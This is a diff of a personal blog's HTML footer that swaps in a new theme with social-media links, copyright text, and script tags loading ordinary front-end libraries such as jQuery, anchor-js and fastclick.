-		<li class="footer-links__link"><a href="/archives">Archive</a></li>
-		
-		  <li class="footer-links__link"><a href="/atom.xml">RSS</a></li>
-	    
-		<li class="footer-links__link"><a href="/about">about page</a></li>
-		<li class="footer-links__link"><a href="/tags">Tags</a></li>
-		<li class="footer-links__link"><a href="/categories">Categories</a></li>
-	</ul>
-</div>
-
-	    
-
-		<div class="footer-credit">
-			<span>© 2019 Yancy | Powered by <a href="http://blog.yancy.cc/">Yancy</a> | Theme <a href="https://github.com/yangcvo">Yancy_GitHub</a></span>
-		</div>
-
-	</div>
 
 
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/yancyoo">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/benet1006">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/yangcvo">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/yangcvo">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Yancy&#39;s blog 2019 
+                    <br>
+                 Theme by <a href="http://blog.yancy.cc">Yancy</a>
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span>
+                    Ported by <a href="http://github.com/yangcvo">Github</a>
+
+                    <!--<iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>--> 
+		</p>
+            </div>
+        </div>
+    </div>
 </footer>
 
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
 
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://blog.yancy.cc/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="http://blog.yancy.cc/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
 
 </body>
 
